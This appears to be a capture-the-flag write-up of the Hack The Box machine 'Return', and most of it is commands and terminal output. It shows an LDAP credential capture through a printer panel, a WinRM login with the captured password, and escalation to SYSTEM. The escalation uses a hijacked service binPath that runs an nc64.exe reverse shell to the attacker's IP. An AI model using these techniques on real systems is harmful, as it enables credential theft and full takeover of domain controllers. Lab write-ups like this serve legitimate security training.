
https://app.hackthebox.com/machines/Return

```

nmap -sCV -v -p- -T4 10.129.95.241 -oA nmap/return                    
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-16 00:24:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

```


![[return-port80.png|459]]

Initially thought this settings page allow us to update password, that doesn't work

![[updating-password-does-not-work.png]]


ifconfig
show my tun0 is 10.10.14.213

```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.213  netmask 255.255.254.0  destination 10.10.14.213

```

![[updating-server-address-then-listener.png|501]]

```
sudo nc -lvnp 389                                                      
[sudo] password for lanc3: 
listening on [any] 389 ...
connect to [10.10.14.213] from (UNKNOWN) [10.129.95.241] 49900
0*`%return\svc-printer
                       1edFg43012!! 
```


```
nxc ldap 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!' -d return.htb --users
LDAP        10.129.95.241   389    PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local)
LDAP        10.129.95.241   389    PRINTER          [+] return.htb\svc-printer:1edFg43012!! (Pwn3d!)
LDAP        10.129.95.241   389    PRINTER          [*] Enumerated 4 domain users: return.htb
LDAP        10.129.95.241   389    PRINTER          -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.95.241   389    PRINTER          Administrator                 2021-07-16 23:03:22 0        Built-in account for administering the computer/domain      
LDAP        10.129.95.241   389    PRINTER          Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.95.241   389    PRINTER          krbtgt                        2021-05-20 21:26:54 0        Key Distribution Center Service Account                     
LDAP        10.129.95.241   389    PRINTER          svc-printer                   2021-05-26 16:15:13 0        Service Account for Printer 
```

---

`5985/tcp open http Microsoft HTTPAPI httpd 2.0`

- **Port 5985** is the default port for **WinRM (Windows Remote Management)** over HTTP.

- seeing this port open on a Windows machine is an immediate invitation to try **Evil-WinRM** since we have a set of credentials now - svc-print % 1edFg43012!!

- **Port 47001** is also open, which is the **WinRM Management Service**—further confirming that the service is active and listening.

-------

```
evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.9
...
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 

```
-----

multiple ways to get SYSTEM access
- abuse `SeLoadDriverPrivilege` by loading a vulnerable driver and exploiting it. 
- `SeBackupPrivilege` to get arbitrary file read ( practise Blackfield in HTB for this). 
- `SeMachineAccountPrivilege`  to add a machine to the domain (seems harder)

-------


classic **Service Binary Path Hijacking** attack. 

In Windows, many services run with `SYSTEM` privileges. If you have the right permissions 
(like being in the **Server Operators** group), 
you can tell Windows: _"Hey, instead of running the normal program for this service, run my malicious file instead."_

breakdown of how it works and it is "unstable."

---

## 1. Core Concept: `binPath`

Every Windows service has a property called `binPath` (binary path). This is simply the file path to the `.exe` that starts when the service is triggered.

When running: 
`sc.exe config [ServiceName] binpath= "C:\path\to\shell.exe"`

we are overwriting the legitimate program with our own. 

When the service starts, Windows executes `shell.exe` with the same privileges as the original service—usually **SYSTEM**.

---

## 2. Why shell is "Unstable"

Reverse shell connects and then dies after 20–30 seconds. This isn't a network error; it’s a Windows Service Control Manager (SCM) behavior:

- **The Handshake:** When Windows starts a service, it expects that service to send back a "Start Success" signal within a certain timeframe.
  
- **The Failure:** Since `msfvenom` payload or reverse shell is just a standard executable and not a "service-aware" program, it never sends that signal.

- **The Kill:** Windows thinks the service failed to start or hung, so it **kills the process** to clean up. This drops the connection.


---

## 3. How to Stabilize (The "Migration" Step)

**Meterpreter** because it has a built-in feature called **migration**.

1. **Catch the shell:** Your unstable shell hits your listener.
2. **Migrate:** You immediately tell Meterpreter to "jump" into a legitimate, long-running process like `explorer.exe` or `services.exe`.
3. **Persistence:** Once you migrate, you are running as a thread inside a stable process that Windows _isn't_ trying to kill. Even when the SCM kills your original service process, your migrated thread stays alive.

however, meterpreter is part of metasploit, we can only use it once per exam. best to learn how to work without it

---

## 4.  No Metasploit

Since exam limits Metasploit usage,  practise the **non-meterpreter** way to avoid the stability issue:

Instead of a reverse shell, use the service to add a new user or promote yourself to Administrator. These commands execute instantly and don't care if the process is killed afterward.


-----

Server Operators

```
A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. Default [User Rights](https://ss64.com/nt/ntrights.html): Allow log on locally: SeInteractiveLogonRight Back up files and directories: SeBackupPrivilege Change the system time: SeSystemTimePrivilege Change the time zone: SeTimeZonePrivilege Force shutdown from a remote system: SeRemoteShutdownPrivilege Restore files and directories SeRestorePrivilege Shut down the system: SeShutdownPrivilege
```

sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\nc64.exe -e cmd 10.10.14.213 443"

this won't work as nc64.exe has to be in C:\programdata folder

sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.213 443"

sc.exe start vss

-------

```
*Evil-WinRM* PS C:\> upload /home/lanc3/nc64.exe
                                        
Info: Uploading /home/lanc3/nc64.exe to C:\\nc64.exe
                                        
Data: 73728 bytes of 73728 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\> sc.exe query
[SC] OpenSCManager FAILED 5:

Access is denied.

*Evil-WinRM* PS C:\> sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\nc64.exe -e cmd 10.10.14.213 443"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\> sc.exe start VSS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

*Evil-WinRM* PS C:\> ping 10.10.14.213

Pinging 10.10.14.213 with 32 bytes of data:
Reply from 10.10.14.213: bytes=32 time=11ms TTL=63
Reply from 10.10.14.213: bytes=32 time=51ms TTL=63


*Evil-WinRM* PS C:\> cd programdata
*Evil-WinRM* PS C:\programdata> upload /home/lanc3/nc64.exe
 
 
Info: Uploading /home/lanc3/nc64.exe to C:\programdata\nc64.exe

Data: 73728 bytes of 73728 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.213 443"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\programdata> sc.exe start VSS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

*Evil-WinRM* PS C:\programdata> 

```
------

```
nc -lnvp 443               
listening on [any] 443 ...
connect to [10.10.14.213] from (UNKNOWN) [10.129.95.241] 53002
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami  
whoami
nt authority\system

C:\Windows\system32>cd C:\users 
cd C:\users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E

 Directory of C:\Users

05/26/2021  01:51 AM    <DIR>          .
05/26/2021  01:51 AM    <DIR>          ..
09/27/2021  04:40 AM    <DIR>          Administrator
05/26/2021  01:50 AM    <DIR>          Public
05/26/2021  01:51 AM    <DIR>          svc-printer
               0 File(s)              0 bytes
               5 Dir(s)   8,835,874,816 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E

 Directory of C:\Users\Administrator

09/27/2021  04:40 AM    <DIR>          .
09/27/2021  04:40 AM    <DIR>          ..
05/20/2021  12:10 PM    <DIR>          3D Objects
05/20/2021  12:10 PM    <DIR>          Contacts
09/27/2021  04:22 AM    <DIR>          Desktop
05/27/2021  12:50 AM    <DIR>          Documents
05/26/2021  03:00 AM    <DIR>          Downloads
05/20/2021  12:10 PM    <DIR>          Favorites
05/20/2021  12:10 PM    <DIR>          Links
05/20/2021  12:10 PM    <DIR>          Music
05/20/2021  12:10 PM    <DIR>          Pictures
05/20/2021  12:10 PM    <DIR>          Saved Games
05/20/2021  12:10 PM    <DIR>          Searches
05/20/2021  12:10 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   8,835,874,816 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E

 Directory of C:\Users\Administrator\Desktop

09/27/2021  04:22 AM    <DIR>          .
09/27/2021  04:22 AM    <DIR>          ..
04/15/2026  10:33 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,835,874,816 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ea3d04bd1c85ea01eeb6c8234afbacf2

C:\Users\Administrator\Desktop>


```


```
how Windows handles **Permissions (ACLs)** for the Service Control Manager (SCM) vs. the **Permissions** for an individual service.

Here is the breakdown of why one failed while the other succeeded:

### 1. The Manager vs. The Object

Think of the SCM as a building manager and the VSS service as a specific room in that building.

- **`sc.exe query`**: This command asks the "Building Manager" for a list of _every_ room and its status. To do this, your user needs the `SC_MANAGER_ENUMERATE_SERVICE` right on the SCM itself. On many hardened systems (or specific HTB boxes), standard users are denied the right to enumerate the entire list to prevent "discovery."
    
- **`sc.exe start VSS`**: This is you walking straight to a specific "Room" (VSS) and turning the doorknob. Because your user (`svc-printer`) is a member of **Server Operators**, you have been explicitly granted full control over the individual service objects, even if you aren't allowed to list the manager's inventory.
    

### 2. The "Failed 1053" Error

Don't let that "FAILED" message discourage you! In the context of a reverse shell, **Error 1053 is actually a sign of success.**

As we discussed earlier, the SCM expects a service to "check in" and say "I'm running!" within about 30 seconds.

- Because `nc64.exe` is a standard program and not a "Service Program," it doesn't know how to talk to the SCM.
    
- The SCM waits, gets no response, and then throws **Error 1053 (The service did not respond...)**.
    
- **Crucially:** The command you put in `binpath` _did_ execute. If your listener on `10.10.14.213:443` was active, you should have received a connection the moment you hit enter on `sc.exe start VSS`.
    

### Troubleshooting your Reverse Shell

If you ran `sc.exe start VSS` and did **not** get a shell on your Kali machine despite the "Success" message, check these three things:

1. **The Space after `binpath=`**: This is a weird syntax requirement for `sc.exe`. There **must** be a space after the equals sign. (Your command looks correct here: `binpath= "C:\..."`).
    
2. **Firewall/Ports:** You are using port **443**. While this is great for bypassing outbound filters, make sure your listener is actually running (`nc -lvnp 443`).
    
3. **The "Kill" Factor:** Because of that 1053 error, the SCM likely killed your `nc64.exe` process immediately after it threw the error. This is why the "Net User" trick is often preferred—it finishes before the SCM can kill it.
    

---

### Pro-Tip for your Blog

Explain that **`sc.exe` commands operate on two levels of permissions**:

1. **Global Permissions:** Required to query/enumerate (often restricted).
    
2. **Specific Permissions:** Based on Group Policy (Server Operators get "Modified" access to specific service objects).
    

This is why a hacker doesn't always need to be able to "see" a service to "hit" it!
```